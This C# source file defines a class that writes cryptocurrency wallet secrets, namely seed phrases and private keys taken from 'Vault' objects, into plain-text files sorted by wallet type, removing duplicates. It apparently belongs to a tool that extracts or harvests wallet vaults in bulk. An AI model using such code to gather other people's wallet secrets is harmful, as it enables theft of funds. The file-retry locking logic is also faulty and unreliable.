using static Structures;
using static Structures.Vault;

public class Recorders
{
    public class Universal
    {
        public static void RewriteDuplicates(string filePath)
        {
            SemaphoreSlim semaphore = new SemaphoreSlim(0, 1);

            while (true)
            {
                try
                {
                    var Data = File.ReadAllText(filePath).Split("\n");
                    var NewData = string.Join("\n", Data.Distinct().ToList());

                    using (FileStream fs = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.ReadWrite))
                    {
                        using var writer = new StreamWriter(fs);
                        writer.Write(NewData);
                        break;
                    }
                }
                catch (IOException)
                {
                    // Файл недоступен, ждем
                    ThreadPool.QueueUserWorkItem(_ => semaphore.Wait());
                }
            }

            semaphore.Release();
        }

        public static void WriteValues(List<string> values, string savePath, Structures.Types type)
        {
            SemaphoreSlim semaphore = new SemaphoreSlim(0, 1);

            while (true)
            {
                try
                {
                    var uniqueValues = values.Distinct().ToList();

                    if (!File.Exists(savePath) && uniqueValues.Count > 0)
                        File.Create(savePath).Close();

                    uniqueValues.ForEach(value =>
                    {
                        File.AppendAllText(savePath, $"{value}\n");
                        Utils.TryCreateDirectory($"{Path.GetDirectoryName(savePath)}/{type}");
                        File.AppendAllText($"{Path.GetDirectoryName(savePath)}/{type}/{Path.GetFileName(savePath)}", $"{value}\n");
                    });

                    break;
                }
                catch (IOException)
                {
                    ThreadPool.QueueUserWorkItem(_ => semaphore.Wait());
                }
            }

            semaphore.Release();

            RewriteDuplicates(savePath);
            RewriteDuplicates($"{Path.GetDirectoryName(savePath)}/{type}/{Path.GetFileName(savePath)}");
        }

        public static bool Record(string SavePath, Vault.Secret Secret)
        {
            try
            {
                if (Secret.Mnemonics.Count > 0)
                    WriteValues(Secret.Mnemonics.Select(mnemonic => mnemonic.Value).ToList(), $"{SavePath}/Mnemonics.txt", Secret.Type);
                
                if (Secret.PrivateKeys.Count > 0)
                    WriteValues(Secret.PrivateKeys.Select(key => key.Value).ToList(), $"{SavePath}/PrivateKeys.txt", Secret.Type);
            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                return false;
            }

            return true;
        }
    }
}

